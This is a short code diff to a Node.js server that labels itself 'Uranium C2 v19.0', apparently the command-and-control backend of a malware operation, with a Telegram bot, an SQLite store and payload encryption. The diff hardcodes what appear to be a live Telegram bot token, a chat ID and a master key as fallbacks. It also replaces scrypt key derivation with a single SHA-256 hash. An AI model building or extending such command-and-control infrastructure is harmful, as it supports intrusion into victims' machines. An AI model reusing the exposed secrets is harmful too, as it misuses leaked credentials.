@@ -1,3 +1,4 @@
+// Uranium C2 v19.0 — Ghost Matrix (Hardcoded Fallbacks)
 require('dotenv').config();
 const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
@@ -7,9 +8,10 @@ const crypto = require('crypto');
 const zlib = require('zlib');
 const sqlite3 = require('sqlite3').verbose();
 
-const TOKEN = process.env.TG_TOKEN;
-const CHAT_ID = process.env.TG_ID;
-const MASTER_KEY = process.env.MASTER_KEY;
+// القيم المدمجة (تستخدم لو ما لقاها في إعدادات Render)
+const TOKEN = process.env.TG_TOKEN || "8690276775:AAE_4IsiG6XekmLAMnEwOqBDKM-iJ6D7DUo";
+const CHAT_ID = process.env.TG_ID || "7399463177";
+const MASTER_KEY = process.env.MASTER_KEY || "a8f3d9c2b1e7f4a6d8c3b9e2f7a4c1d5e8b3a6f9c2d7e4b1a8f5c3d9e2b7a4c1";
 
 if (!TOKEN || !CHAT_ID || !MASTER_KEY) {
     console.error('[-] Missing env: TG_TOKEN, TG_ID, MASTER_KEY');
@@ -27,7 +29,7 @@ db.serialize(() => {
 });
 
 function deriveKey(secret) {
-    return crypto.scryptSync(secret + '|uranium-v19', 'uranium-v19-salt', 32);
+    return crypto.createHash('sha256').update(secret + '|uranium-v19').digest();
 }
 
 function encryptPayload(plainText, key) {
